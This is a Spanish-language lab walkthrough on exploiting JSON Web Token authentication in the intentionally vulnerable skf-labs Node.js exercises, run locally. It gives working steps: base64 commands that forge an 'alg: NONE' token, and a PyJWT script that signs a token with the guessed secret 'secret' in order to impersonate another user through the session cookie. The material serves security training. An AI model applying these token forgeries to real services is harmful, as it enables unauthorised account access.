# Explotación y guía paso a paso de JWT

## Instalación 

[Laboratorio skf-labs para practicar múltiples vulnerabilidades](https://github.com/blabla1337/skf-labs)

Acción primer laboratorio (sin validación de signature)

```bash
git clone https://github.com/blabla1337/skf-labs
cd skf-labs
cd nodeJs
cd JWT-null
npm install
npm start
```

Acción: segundo laboratorio (con validación de signature)

```bash
cd JWT-secret
npm install
npm start
```

Resultado: ejemplo del primer laboratorio

```bash
> jwt-null@0.0.1 start
> nodemon app

[nodemon] 2.0.14
[nodemon] to restart at any time, enter `rs`
[nodemon] watching path(s): *.*
[nodemon] watching extensions: js,mjs,json
[nodemon] starting `node app.js`
Listening on port 5000...!!!
```

![Captura](./Imágenes/web_1.png)

Explicación: por `localhost:5000` tenemos este laboratorio montado

---
## Explotación 

### Sin validación de signature

Esta página tiene dos usuarios: 'user' y 'user2' con igual contraseña para cada uno. se ponen las credenciales y se le da primero a 'Authenticate' (para que se nos genere el JWT) y luego a 'Admin'. Entonces nos saldrá la siguiente ventana que indicará si somos 'guest' para 'user' o 'mortal' para 'user2'.

![Captura](./Imágenes/web_2.png)

![Captura](./Imágenes/web_4.png)

Al loguearnos en el `DevTools` podemos ver la cookie de sesión asignada. Es un [JWT](JWT.md) el cual identificamos por sus tres partes diferenciadas por `.`  

![Captura](./Imágenes/web_3.png]]

Podemos acudir al recurso web [jwt.io](https://jwt.io/) para visualizar los valores del JWT asignado y analizar su estructura

![Captura](./Imágenes/web_5.png]]

Para poder crear un JWT válido en un servidor que los utiliza para validar a los usuarios y sus permisos. Se requiere de un *signature* el cual coincide con la tercera parte de las 3 que conforma un JWT. Esta sirve para validar la estructura del JWT, sin él no podemos crear un JWT completo válido. 

![[jwt_1.png]]

Sin embargo, existe una mala configuración en los JWT que puede permitir saltarse esta validación del 'signature'. Para ello en el apartado del algoritmo de cifrado `"alg": "HS256` podemos cambiar el valor del tipo de cifrado por `NONE` y tratar así de ignorar la parte del 'signature'. Las dos primeras partes están compuestas por codificación en `base64` por lo que podemos crear manualmente dicha estructura del siguiente modo:

Acción:

```bash
echo -n '{"alg": "NONE","typ": "JWT"}' | base64
```

Resultado:

```bash
eyJhbGciOiAiTk9ORSIsInR5cCI6ICJKV1QifQ==
```

Explicación: 


Acción:

```bash
echo -n '{"id": 2,"iat": 1749825730,"exp": 1749829330}' | base64
```

Resultado:

```bash
eyJpZCI6IDIsImlhdCI6IDE3NDk4MjU3MzAsImV4cCI6IDE3NDk4MjkzMzB9
```

Explicación:  con el *JWT* `eyJhbGciOiAiTk9ORSIsInR5cCI6ICJKV1QifQ.eyJpZCI6IDIsImlhdCI6IDE3NDk4MjU3MzAsImV4cCI6IDE3NDk4MjkzMzB9.` tenemos la parte de la ' cabecera' y del 'payload' pero al añadir el valor *'NONE'* y ser aceptado, hemos desestimado el uso de la parte del 'signature'. Esta es una de las formas de vulnerar un JWT si no esta correctamente sanitizado el servidor

Desde el navegador como 'user' podemos cambiar nuestro valor de cookie y tras darle a `enter` darle a la pestaña de 'Admin' y ver que usuario nos valida

![Captura](./Imágenes/web_6.png]]

Confirmamos que esta web permite el ataque de JWT a través del valor *NONE* que evade la validación del token en su apartado de 'signature'

![Captura](./Imágenes/web_7.png]]

---

### Con validación del signature

En el laboratorio 2 tenemos ahora la práctica con un servidor que si valida el apartado de 'signature' ya que requerimos del valor 'secrets' para crear una estructura válida de JWT

![[web2_1.png]]

Explicación: por `localhost:5000` tenemos este laboratorio montado (hay que detener con `ctrl+c` el laboratorio anterior e instalar e iniciar este laboratorio con `npm`


Acción: probamos los mismos pasos que en el ejercicio anterior

![[web2_2.png]]


![[web2_3.png]]


![[web2_4.png]]


Explicación: vemos que tenemos una estructura igual a la anterior, podríamos probar la misma técnica de usar `NONE` en el algoritmo, pero en este caso no va a funcionar

#### Creando un JWT con signature/secreto

**Primero** recomiendo usar una ventana virtual de python

Acción:

```bash
python3 -m venv venv
source venv/bin/activate
```

**Segundo** nos instalamos la siguiente dependencia

Acción:

```bash
pip install --upgrade pyjwt
```

**Tercero** creamos un [[Script JWT]] 

Script: 

```python
#!/usr/bin/env python3
"""
Genera un JWT con HS256 y clave 'secret'
Payload fijo: {"id": 2, "iat": 1749829182, "exp": 1749832782}
"""

import jwt  # PyJWT

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "id": 2,
    "iat": 1749829182,
    "exp": 1749832782
}

secret = "secret"

token = jwt.encode(
    payload,
    secret,
    algorithm="HS256",
    headers=header
)

# PyJWT ≥ 2.0 devuelve str; en versiones < 2.0 devuelve bytes
if isinstance(token, bytes):
    token = token.decode()

print("JWT generado:")
print(token)
```

Resultado:

```bash
JWT generado:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNzQ5ODI5MTgyLCJleHAiOjE3NDk4MzI3ODJ9.3BltosmJv336EnT4pw0DE9oVw4CuvRn21UNpDl43F0o
```

Explicación: con este **JWT creado manualmente con python** podemos tratar de hacer lo mismo que en el ejercicio anterior, modificar la cookie desde el `DevTools` y ver si accedemos como usuario 2

![[web2_5.png]]

Confirmamos el acceso y concluimos la demostración de como explotar un JWT donde se requiere del parámetro 'signature' o 'secreto' para conformar una estructura válida. Señalar que esto es posible solo si la validación del servidor ocurre tan solo con estos parámetros como la cookie de un JWT. Lo cual no siempre es así y suele validarse con otros campos adicionales, como la verificación del token en el servidor, controles de expiración, listas de revocación, o mecanismos complementarios de autenticación que dificultan este tipo de ataques.

---
